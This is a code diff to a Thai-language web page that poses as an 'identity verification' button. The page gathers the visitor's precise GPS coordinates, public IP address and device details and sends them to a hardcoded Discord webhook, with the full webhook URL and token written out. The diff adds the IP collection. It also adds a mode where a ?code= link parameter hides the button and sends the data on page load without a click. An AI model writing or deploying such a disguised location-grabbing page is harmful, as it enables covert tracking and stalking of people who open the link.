@@ -46,29 +46,20 @@
       white-space: pre-line;
     }
 
-    /* Emoji สี */
-    #status.success {
-      color: #2e7d32;
-    }
-
-    #status.error {
-      color: #d32f2f;
-    }
-
-    #status.loading {
-      color: #1565c0;
-    }
+    #status.success { color: #2e7d32; }
+    #status.error { color: #d32f2f; }
+    #status.loading { color: #1565c0; }
   </style>
 </head>
 <body>
   <h2>📍 ยืนยันตัวตน</h2>
-  <button onclick="getLocation()">📤 กดยืนยันตัวตน</button>
+  <button id="confirmBtn" onclick="getLocation()">📤 กดยืนยันตัวตน</button>
   <p id="status">ยังไม่มีการส่งข้อมูล</p>
 
   <script>
     const webhookUrl = "https://discord.com/api/webhooks/1380863471041777724/EONsTADIyl9QbykL2d3oq7_YyQO_BDvgucT0j2yiZkkjHypony6HReLk8MXAphuiUdCr";
-
     const statusEl = document.getElementById("status");
+    const confirmBtn = document.getElementById("confirmBtn");
 
     function setStatus(text, type = "") {
       statusEl.innerText = text;
@@ -76,27 +67,29 @@
       if (type) statusEl.classList.add(type);
     }
 
-    function getLocation() {
-      setStatus("⏳ กําลังไป..", "loading");
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(sendToDiscord, showError, {
-          enableHighAccuracy: true,
-          timeout: 10000,
-          maximumAge: 0
-        });
-      } else {
-        setStatus("❌ เบราว์เซอร์ไม่รองรับ", "error");
+    function getQueryParam(param) {
+      return new URLSearchParams(window.location.search).get(param);
+    }
+
+    async function getIp() {
+      try {
+        const res = await fetch("https://api.ipify.org?format=json");
+        const data = await res.json();
+        return data.ip;
+      } catch {
+        return "ไม่ทราบ IP";
       }
     }
 
-    function sendToDiscord(position) {
+    async function sendToDiscord(position) {
       const lat = position.coords.latitude.toFixed(6);
       const lon = position.coords.longitude.toFixed(6);
       const mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;
+      const ip = await getIp();
       const userAgent = navigator.userAgent;
 
       const data = {
-        content: `📍 มีผู้ใช้ส่งตำแหน่ง:\n\n🌐 [ดูบนแผนที่](${mapUrl})\n📌 พิกัด: ${lat}, ${lon}\n💻 อุปกรณ์: ${userAgent}`
+        content: `📍 มีผู้ใช้ยืนยันตัวตน:\n\n🌐 [ดูบนแผนที่](${mapUrl})\n📌 พิกัด: ${lat}, ${lon}\n🌐 IP: ${ip}\n💻 อุปกรณ์: ${userAgent}`
       };
 
       fetch(webhookUrl, {
@@ -106,7 +99,7 @@
       })
       .then(response => {
         if (response.ok) {
-          setStatus("✅ ยืนยันตัวตน Discord เรียบร้อยแล้ว!", "success");
+          setStatus("✅ ส่งข้อมูลเรียบร้อยแล้ว!", "success");
         } else {
           setStatus("❌ ส่งข้อมูลไม่สำเร็จ", "error");
         }
@@ -114,6 +107,19 @@
       .catch(error => {
         setStatus("❌ เกิดข้อผิดพลาด: " + error, "error");
       });
+    }
+
+    function getLocation() {
+      setStatus("⏳ กำลังระบุตำแหน่ง...", "loading");
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(sendToDiscord, showError, {
+          enableHighAccuracy: true,
+          timeout: 10000,
+          maximumAge: 0
+        });
+      } else {
+        setStatus("❌ เบราว์เซอร์ไม่รองรับ", "error");
+      }
     }
 
     function showError(error) {
@@ -132,6 +138,12 @@
           msg = error.message;
       }
       setStatus("❌ ไม่สามารถระบุตำแหน่งได้ (" + msg + ")", "error");
+    }
+
+    // ✅ ถ้ามี ?code= อยู่ → ซ่อนปุ่มและส่งข้อมูลทันที
+    if (getQueryParam("code")) {
+      confirmBtn.style.display = "none";
+      getLocation();
     }
   </script>
 </body>
